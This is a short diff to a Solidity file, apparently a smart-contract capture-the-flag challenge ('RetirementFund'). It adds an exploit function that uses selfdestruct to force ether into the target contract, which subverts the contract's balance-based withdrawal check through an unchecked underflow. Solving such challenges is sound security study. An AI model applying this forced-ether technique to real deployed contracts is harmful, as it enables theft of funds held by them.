@@ -38,7 +38,6 @@ contract RetirementFund {
         uint256 withdrawn = 0;
         unchecked {
             withdrawn += startBalance - address(this).balance;
-
             // an early withdrawal occurred
             require(withdrawn > 0);
         }
@@ -56,6 +55,13 @@ contract ExploitContract {
     constructor(RetirementFund _retirementFund) {
         retirementFund = _retirementFund;
     }
+
+    function forceSendEther() public payable {
+        address payable retirementFundPayable  = payable(address(retirementFund));
+        selfdestruct(retirementFundPayable);
+    }
+
+    receive() external payable {}
 
     // write your exploit functions below
 }
